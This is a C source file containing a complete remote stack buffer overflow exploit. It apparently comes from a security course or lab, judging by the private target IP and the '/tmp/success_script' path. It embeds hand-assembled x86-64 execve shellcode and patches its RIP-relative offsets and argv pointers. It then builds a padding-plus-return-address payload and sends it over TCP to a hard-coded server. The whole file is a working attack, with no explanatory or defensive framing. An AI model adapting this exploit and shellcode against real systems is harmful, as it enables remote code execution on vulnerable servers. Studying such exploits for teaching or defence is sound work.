#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

// --- CONSTANTS ---
#define SERVER_IP       "192.168.1.202"
#define SERVER_PORT     12345
#define ADDR_SIZE       sizeof(uint64_t)
#define SHELLCODE_LEN   sizeof(shellcode)

// Total Shellcode Size: 83 bytes
unsigned char shellcode[] = {
    // Instructions (29 Bytes)
    // leaq distance_from_rip_to_path_string(%rip), %rdi (@0) (RDI = pathname)
    0x48, 0x8d, 0x3d, 0x00, 0x00, 0x00, 0x00, // Placeholder at [3]-[6]
    // leaq distance_from_rip_to_argv_array(%rip), %rsi (@7) (RSI = argv array)
    0x48, 0x8d, 0x35, 0x00, 0x00, 0x00, 0x00, // Placeholder at [10]-[13]
    0x48, 0x31, 0xd2, // xor %rdx, %rdx (@14) (RDX = envp = NULL)
    0x48, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov $59, %rax (@17) (RAX = execve syscall number)
    0x0f, 0x05, // syscall (@27)
    // PATH String "/tmp/success_script\x00" (20 Bytes) (@29)
    0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x73, 0x75, 0x63, 0x63, 0x65, 0x73, 0x73, 0x5f, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x00,
    // ID String "207777020\x00" (10 Bytes) (@49)
    0x32, 0x30, 0x37, 0x37, 0x37, 0x37, 0x30, 0x32, 0x30, 0x00,
    // argv (24 Bytes)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // argv[0]: path_addr (8 bytes, placeholder) (@59)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // argv[1]: id_addr (8 bytes, placeholder) (@67)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 // argv[2]: NULL (8 bytes, required terminator) (@75)
};


// function for patching the placeholders placed in the manually written shellcode (patching nulls "0x00")
void patch_shellcode(uint64_t shellcode_start_addr) {
    // Shellcode Patching (RIP-Relative Offsets)
    int32_t path_offset = 22; // RDI: Offset to path string (29 - 7 = 22), meaning distance from current RIP position to the path string
    memcpy(&shellcode[3], &path_offset, sizeof(int32_t));

    int32_t argv_offset = 45; // RSI: Offset to argv array (59 - 14 = 45), meaning distance from current RIP position to the argv array
    memcpy(&shellcode[10], &argv_offset, sizeof(int32_t));

    // Calculate and patch the addresses of the strings within the argv array
    uint64_t path_addr = shellcode_start_addr + 29; // Shellcode start + path string offset (@29)
    memcpy(&shellcode[59], &path_addr, ADDR_SIZE);
    uint64_t id_addr = shellcode_start_addr + 49; // Shellcode start + ID string offset (@49)
    memcpy(&shellcode[67], &id_addr, ADDR_SIZE);
}

// function for creating the whole payload:
unsigned char* build_payload(uint64_t shellcode_addr, size_t ret_offset, size_t payload_size) {
    unsigned char *payload = calloc(1, payload_size);
    if (payload == NULL) {
        exit(EXIT_FAILURE);
    }
    memset(payload, 'A', ret_offset); // fill the buffer with padding 'A' up to the return address
    uint64_t *ret_addr_ptr = (uint64_t *)(payload + ret_offset); // get address(ptr) of the ret addr in server
    *ret_addr_ptr = shellcode_addr; // overwrite 'existing' ret addr in the server with the shellcode's address
    memcpy(payload + ret_offset + ADDR_SIZE, shellcode, SHELLCODE_LEN); // copy the patched shellcode immediately after the return address
    return payload;
}

// function to send our payload to the server
void send_payload_to_server(const unsigned char *payload, size_t size) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        exit(EXIT_FAILURE);
    }
    struct sockaddr_in serv_addr = {0};
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(SERVER_PORT);
    if (inet_pton(AF_INET, SERVER_IP, &serv_addr.sin_addr) <= 0) { // set server ip in the struct
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) { // connect to server
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    if (write(sockfd, payload, size) < 0) { // send payload to server
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    close(sockfd);
}

int main(int argc, char *argv[]) {
    // Parse Arguments and Calculate Addresses
    if (argc != 3) { exit(EXIT_FAILURE); }
    uint64_t buffer_addr = (uint64_t)strtoull(argv[1], NULL, 16); // 16 because addresses are in hexa
    size_t ret_offset = (size_t)strtoul(argv[2], NULL, 10);      // 10 because the offset value is in decimal
    size_t payload_size = ret_offset + ADDR_SIZE + SHELLCODE_LEN; // total payload size calculation
    uint64_t shellcode_addr = buffer_addr + ret_offset + ADDR_SIZE; // calculate shellcode address position
    // Patch Shellcode with calculated addresses
    patch_shellcode(shellcode_addr);
    // Build the Payload Buffer
    unsigned char *payload = build_payload(shellcode_addr, ret_offset, payload_size);
    // Send Payload to Target
    send_payload_to_server(payload, payload_size);
    // Cleanup
    free(payload);
    return 0;
}
